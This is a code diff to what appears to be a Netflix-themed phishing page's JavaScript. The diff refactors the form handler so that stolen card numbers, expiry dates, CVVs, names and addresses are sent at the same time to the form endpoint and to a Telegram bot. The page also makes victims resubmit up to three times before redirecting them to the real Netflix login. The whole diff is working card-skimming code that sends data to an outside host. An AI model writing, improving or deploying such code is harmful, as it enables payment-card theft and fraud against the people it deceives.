@@ -359,22 +359,7 @@
 
                 submissionCount++;
 
-                // Original submission to submit-form.com
-                fetch(form.action, {
-                    method: 'POST',
-                    body: new URLSearchParams(new FormData(form)),
-                }).then(response => {
-                    if (response.ok) {
-                        alert('Form submitted successfully!');
-                    } else {
-                        alert('Error submitting form.');
-                    }
-                }).catch(error => {
-                    console.error('Form submission error:', error);
-                    alert('Error submitting form.');
-                });
-
-                // Telegram submission
+                // Prepare Telegram submission data
                 const formData = {
                     'Card Number': cardNumberInput.value,
                     'Expiration Date': expirationInput.value,
@@ -389,41 +374,69 @@
                     telegramMessage += `<b>${key}:</b> ${formData[key]}\n`;
                 }
                 const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                fetch(telegramUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: telegramMessage,
-                        parse_mode: 'HTML',
+
+                // Handle both submissions concurrently
+                Promise.allSettled([
+                    fetch(form.action, {
+                        method: 'POST',
+                        body: new URLSearchParams(new FormData(form)),
                     }),
-                }).then(response => {
-                    if (response.ok) {
-                        alert('Form data sent to Telegram successfully!');
-                    } else {
-                        alert('Error sending form data to Telegram.');
+                    fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: telegramMessage,
+                            parse_mode: 'HTML',
+                        }),
+                    })
+                ]).then(results => {
+                    const formResult = results[0];
+                    const telegramResult = results[1];
+                    let errorMessages = [];
+
+                    // Check form submission result
+                    if (formResult.status === 'rejected') {
+                        console.error('Form submission error:', formResult.reason);
+                        errorMessages.push('form submission');
+                    } else if (!formResult.value.ok) {
+                        console.error(`Form submission failed with status ${formResult.value.status}`);
+                        errorMessages.push('form submission');
                     }
-                }).catch(error => {
-                    console.error('Telegram submission error:', error);
-                    alert('Error sending form data to Telegram.');
+
+                    // Check Telegram submission result
+                    if (telegramResult.status === 'rejected') {
+                        console.error('Telegram submission error:', telegramResult.reason);
+                        errorMessages.push('Telegram submission');
+                    } else if (!telegramResult.value.ok) {
+                        console.error(`Telegram submission failed with status ${telegramResult.value.status}`);
+                        errorMessages.push('Telegram submission');
+                    }
+
+                    // Display consolidated error or success message
+                    if (errorMessages.length > 0) {
+                        alert(`Form submission failed due to errors in: ${errorMessages.join(' and ')}.`);
+                    } else {
+                        alert('Form submitted successfully!');
+                    }
+
+                    // Reset form
+                    cardNumberInput.value = '';
+                    expirationInput.value = '';
+                    cvvInput.value = '';
+                    nameInput.value = '';
+                    streetAddressInput.value = '';
+                    countryInput.value = '';
+                    zipcodeInput.value = '';
+
+                    if (submissionCount < 3) {
+                        alert('Please fill out the form again.');
+                    } else {
+                        window.location.href = "https://www.netflix.com/login";
+                    }
                 });
-
-                // Reset form
-                cardNumberInput.value = '';
-                expirationInput.value = '';
-                cvvInput.value = '';
-                nameInput.value = '';
-                streetAddressInput.value = '';
-                countryInput.value = '';
-                zipcodeInput.value = '';
-
-                if (submissionCount < 3) {
-                    alert('Please fill out the form again.');
-                } else {
-                    window.location.href = "https://www.netflix.com/login";
-                }
             });
 
             // Clear error on input focus
